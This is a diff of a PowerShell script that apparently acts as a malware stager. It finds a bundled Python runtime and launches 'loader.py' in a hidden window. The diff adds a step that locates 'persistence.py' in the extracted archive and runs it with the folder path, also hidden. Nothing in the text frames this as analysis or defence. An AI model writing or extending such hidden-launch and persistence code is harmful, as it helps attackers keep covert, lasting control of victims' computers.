@@ -1,4 +1,3 @@
-
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
 # ---------- Config ----------
@@ -42,6 +41,12 @@ $pyScript = [string](
     Select-Object -First 1 -ExpandProperty FullName
 )
 
+# ---------- Locate persistence script ----------
+$persistScript = [string](
+    Get-ChildItem $extractTo -Recurse -Filter 'persistence.py' -ErrorAction SilentlyContinue |
+    Select-Object -First 1 -ExpandProperty FullName
+)
+
 if (-not $pythonExe) { Write-Error "No real Python runtime found"; return }
 if (-not $pyScript)  { Write-Error "No loader.py found"; return }
 
@@ -75,11 +80,26 @@ if ($LASTEXITCODE -ne 0) {
 }
 Write-Host "[*] Version: $ver"
 
-# ---------- Execute ----------
+# ---------- Execute loader ----------
 $p = Start-Process -FilePath $pythonExe `
                    -ArgumentList @($pyScript) `
                    -WorkingDirectory $scriptDir `
                    -WindowStyle Hidden `
                    -PassThru
 
-Write-Host "[*] Started PID: $($p.Id)"
+Write-Host "[*] Loader PID: $($p.Id)"
+
+# ---------- Execute persistence (with folder argument) ----------
+if ($persistScript) {
+    Write-Host "[*] Persistence: $persistScript"
+
+    $pp = Start-Process -FilePath $pythonExe `
+                        -ArgumentList @($persistScript, $extractTo) `
+                        -WorkingDirectory (Split-Path -Parent $persistScript) `
+                        -WindowStyle Hidden `
+                        -PassThru
+
+    Write-Host "[*] Persistence PID: $($pp.Id)"
+} else {
+    Write-Host "[!] persistence.py not found in archive"
+}
